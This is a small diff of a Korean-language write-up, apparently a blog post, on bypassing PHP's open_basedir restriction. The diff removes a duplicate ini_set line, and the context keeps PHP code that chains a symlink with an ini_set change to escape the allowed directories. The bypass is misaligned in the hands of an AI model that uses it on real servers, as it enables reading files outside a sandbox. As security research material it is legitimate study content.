@@ -142,7 +142,6 @@ shiina -> /var/www/html/shpik/04/symlink/a/b/c/d/e/f/g/h/j/j/k
 마지막으로 symlink(shiina)는 unlink해줍니다. 
 
 ```php
-ini_set('open_basedir','/var/www/html:goto/')
 symlink('shiina/../../../../../../','goto');
 ini_set('open_basedir','/var/www/html:goto/');
 unlink('shiina');
@@ -164,4 +163,3 @@ highlight_file(__FILE__);
 ```
 
 ![open_basedir bypass using symlink](http://shpik.kr/static/img/open_basedir_03.png)
-
